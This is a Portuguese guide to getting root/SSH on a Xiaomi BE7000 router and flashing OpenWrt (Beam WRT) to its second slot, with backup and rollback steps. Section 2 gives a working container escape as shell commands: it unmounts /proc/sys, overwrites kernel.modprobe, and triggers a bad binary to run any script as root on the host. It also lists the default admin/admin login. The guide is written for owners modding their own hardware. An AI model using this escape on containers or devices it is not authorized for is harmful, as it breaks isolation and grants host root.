# Xiaomi BE7000 — Desbloqueio de root/SSH e instalação de OpenWrt (Beam WRT)

Guia completo para desbloquear acesso **root/SSH** no roteador **Xiaomi BE7000** (firmware stock `1.1.38`, kernel `5.4.164`) e instalar o **OpenWrt (Beam WRT)**, **preservando o firmware original no slot de fábrica**.

> ⚠️ **Aviso importante**
> Este procedimento é para uso no **seu próprio aparelho**. Mexer em firmware de roteador envolve risco (brick). Faça **backup completo antes de qualquer gravação** (seção [Backup](#3-backup-completo-do-firmware)). O método de recuperação (power cycle) está descrito na seção [Recuperação](#5-recuperação--rollback).

---

## Sumário

1. [Visão geral](#1-visão-geral)
2. [Desbloqueando acesso root (escape de contêiner)](#2-desbloqueando-acesso-root-escape-de-contêiner)
3. [Backup completo do firmware](#3-backup-completo-do-firmware)
4. [Instalando o OpenWrt](#4-instalando-o-openwrt)
5. [Recuperação / rollback](#5-recuperação--rollback)
6. [Por que a 1ª tentativa de OpenWrt falhou](#6-por-que-a-1ª-tentativa-de-openwrt-falhou)
7. [Referências](#7-referências)

---

## 1. Visão geral

O roteador tem **dois slots de firmware**:

| Slot | Partição MTD | Uso |
|---|---|---|
| 0 (fábrica) | `mtd23` (`rootfs`) | Firmware stock Xiaomi (mantido intacto) |
| 1 | `mtd24` (`rootfs_1`) | OpenWrt (Beam WRT) |

O bootloader decide qual slot bootar pela variável `flag_boot_rootfs` (`0` = stock, `1` = OpenWrt).

**Fluxo realizado:**

1. O `release_agent` do tutorial clássico **não funcionou** (kernel bloqueia o mecanismo).
2. Usamos um **escape de contêiner via `modprobe_path` + `/proc/sys`** para obter execução de comandos como root no host.
3. Fizemos **backup completo** de todas as partições MTD.
4. Instalamos o OpenWrt. A 1ª tentativa (imagem do kravasuper) **não bootou** — descobrimos que era um **bug conhecido no driver Ethernet** (`qcom-ppe`).
5. Trocamos para o **Beam WRT v1.5.0** (build com o bug corrigido) e **funcionou**.

---

## 2. Desbloqueando acesso root (escape de contêiner)

O roteador roda o **SimpleDocker** (gerenciador Docker com UI web) dentro de um contêiner Docker **com todas as capabilities** (`CapEff: 0000003fffffffff`). Isso dá um caminho de escape.

### 2.1 Contexto

- SimpleDocker: `http://192.168.30.1:9001` (login padrão `admin`/`admin`).
- O contêiner tem `/var/run/docker.sock` montado (mas o `opa-docker-authz` bloqueia criação de contêineres privilegiados).
- O contêiner tem `SYS_ADMIN`, `SYS_RAWIO`, `MKNOD` etc. (todas as capabilities).

### 2.2 O método que funcionou: `modprobe_path`

O `/proc/sys/kernel/modprobe` é uma variável **global do kernel** (não é por-namespace). Se conseguirmos escrever nela, o kernel executará o nosso script como **root no host** sempre que tentar carregar um módulo de kernel.

**Passos (dentro do terminal do contêiner):**

1. Tornar `/proc/sys` gravável (remover o mount read-only que o Docker impõe):

   ```sh
   umount /proc/sys
   ```

2. Descobrir o caminho do overlay do contêiner no host (é onde os arquivos do contêiner ficam visíveis para o host):

   ```sh
   UPPERDIR=$(cat /proc/mounts | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
   echo "$UPPERDIR"
   ```

3. Criar um script que será executado no host (exemplo: habilitar SSH):

   ```sh
   cat << 'EOF' > /exploit.sh
   #!/bin/sh
   export PATH=/usr/sbin:/usr/bin:/sbin:/bin
   nvram set ssh_en=1
   nvram commit
   /etc/init.d/dropbear start
   EOF
   chmod +x /exploit.sh
   ```

4. Apontar o `modprobe` para o script (usando o caminho do host) e disparar:

   ```sh
   echo "$UPPERDIR/exploit.sh" > /proc/sys/kernel/modprobe
   printf '\377\377\377\377' > /tmp/bad
   chmod +x /tmp/bad
   /tmp/bad   # executa um binário com magic inválido -> kernel tenta modprobe -> roda o exploit.sh como root no host
   ```

5. O script roda **no host, como root**. Use-o para o que precisar (habilitar SSH, alterar senha, etc.).

> O mesmo vetor serve para **qualquer comando no host**: grave o script, aponte o `modprobe`, dispare, e leia um log escrito em `$UPPERDIR/...`.

---

## 3. Backup completo do firmware

**Nunca pule este passo.** Os dados mais críticos são `ART` (calibração Wi-Fi) e `bdata` (MAC/serial).

Os dispositivos de bloco MTD já existem em `/dev/mtdblock0` … `/dev/mtdblock32`.

```sh
B=/mnt/usb-686f36a2/backup
mkdir -p "$B"
cat /proc/mtd > "$B/mtd_layout.txt"
i=0
while [ $i -le 32 ]; do
    dd if="/dev/mtdblock$i" of="$B/mtd$i.bin" bs=1048576
    i=$((i+1))
done
```

> A partição `mtd32` (`cfg`) fica ligada ao UBI e retorna `Resource busy` no `dd`. Nesse caso, leia pelo volume UBI:
>
> ```sh
> ubiattach -p /dev/mtd32 -d 2
> dd if=/dev/ubi2_1 of="$B/mtd32_cfg_ubi.bin"
> ```
>
> (verifique o número do volume com `ubinfo`.)

Verifique os tamanhos e calcule hashes (`md5sum`/`sha256sum`) para conferir depois.

---

## 4. Instalando o OpenWrt

### 4.1 Escolher a imagem certa

- ❌ **Não use** a imagem do repositório `kravasuper/xiaomi-be7000-openwrt-installer` diretamente — ela tem um **bug no driver Ethernet** que faz o roteador travar no boot (LED piscando, sem rede).
- ✅ **Use o [Beam WRT](https://github.com/timofey-maykov/be7000-openwrt)** (build com os patches de correção). Versão testada: **v1.5.0**.

Imagem (release v1.5.0):

```
openwrt-qualcommbe-ipq95xx-xiaomi_be7000-squashfs-factory.ubi
SHA256: 9f98aaff325d76b879d5aeae1d5fe7c13cc65dd8d4f115a429aaf011f509c5bc
```

### 4.2 Gravar no slot 1 (`mtd24` / `rootfs_1`)

1. Baixe a imagem e **confira o SHA256**.
2. Desligue qualquer UBI que esteja preso ao `mtd24` (se você o inspecionou antes):

   ```sh
   umount /tmp/sq 2>/dev/null          # se montou o squashfs
   ubiblock -r /dev/ubi5_1 2>/dev/null # se criou ubiblock
   ubidetach -p /dev/mtd24             # desliga o UBI
   ```

3. Grave:

   ```sh
   ubiformat /dev/mtd24 -y -f factory.ubi
   ```

4. Troque os flags de boot para o slot 1 e confirme:

   ```sh
   nvram set flag_boot_rootfs=1
   nvram set flag_last_success=1
   nvram set flag_boot_success=1
   nvram set flag_try_sys1_failed=0
   nvram set flag_try_sys2_failed=0
   nvram set flag_ota_reboot=0
   nvram commit
   nvram get flag_boot_rootfs   # deve retornar 1
   ```

5. Reinicie:

   ```sh
   reboot
   ```

A primeira carga do Beam WRT demora ~1 minuto. Ele **importa automaticamente** o endereço de rede, Wi-Fi e internet do stock. Se o stock estava configurado em `192.168.30.1`, o OpenWrt fica em `192.168.30.1`; senão, fica em `192.168.1.1` (Wi-Fi padrão `OpenWrt-BE7000` / senha `be7000openwrt`).

Primeiro acesso: usuário `root`, senha **vazia** (defina uma senha forte logo em seguida).

---

## 5. Recuperação / rollback

### 5.1 Se o OpenWrt não bootar (LED piscando, sem rede)

O bootloader tem fallback automático. **Ligue/desligue a energia 4 vezes** (cada ciclo: ligar → ~15s → desligar → ~5s). Após a 4ª tentativa, ele **volta sozinho para o stock (slot 0)**.

### 5.2 Voltar ao stock manualmente

Com acesso root (SSH no stock, ou via SimpleDocker), resete os flags:

```sh
nvram set flag_boot_rootfs=0
nvram set flag_last_success=0
nvram set flag_boot_success=1
nvram set flag_try_sys1_failed=0
nvram set flag_try_sys2_failed=0
nvram set flag_ota_reboot=0
nvram commit
reboot
```

### 5.3 Pelo LuCI do Beam WRT

No Beam WRT, a página **Sistema → Slots** mostra os dois slots e permite trocar a carga para o slot de fábrica (rollback).

---

## 6. Por que a 1ª tentativa de OpenWrt falhou

A gravação e a imagem estavam **corretas** (volumes UBI `kernel` + `ubi_rootfs` + `rootfs_data` verificados, squashfs montou). O problema eram **3 bugs no driver Ethernet `qcom-ppe`** (documentados em [Habr: три бага в драйвере Ethernet](https://habr.com/en/articles/1085258/)):

1. `qca8084_xpcs_set_mode()` espera 100 ms por um link SerDes que ainda não existe (em placas onde o bootloader não pré-liga o UNIPHY).
2. O rollback do driver chama `napi_disable()` num NAPI nunca habilitado → **trava para sempre** (`kmodloader`).
3. Corrigido o #2, o código de rollback anda "para trás" no array (`port[-2]`, `port[-3]`) e **crasha**.

Juntos, esses bugs fazem o roteador parecer "morto" (LED piscando, sem rede/Wi-Fi/SSH). O **Beam WRT** aplica os patches de correção (e a v1.5.0 corrige também um problema de boot nas placas dos lotes mais recentes).

---

## 7. Referências

- [timofey-maykov/be7000-openwrt (Beam WRT)](https://github.com/timofey-maykov/be7000-openwrt)
- [kravasuper/xiaomi-be7000-openwrt-installer](https://github.com/kravasuper/xiaomi-be7000-openwrt-installer)
- [Habr: três bugs no driver Ethernet do BE7000](https://habr.com/en/articles/1085258/)
- [DD-WRT Wiki: Xiaomi BE7000](https://wiki.dd-wrt.com/wiki/Xiaomi_BE7000)
- [恩山论坛: BE7000 解锁 SSH](https://www.right.com.cn/forum/thread-8476081-1-1.html)
- [恩山论坛: BE7000 TTL 救砖 (unbrick)](https://www.right.com.cn/forum/forum.php?mod=viewthread&ordertype=2&tid=8362250)

---

## Licença / uso

Documentação de referência pessoal. Use por sua conta e risco, somente no seu próprio equipamento. Não inclua senhas/credenciais reais em repositórios públicos.
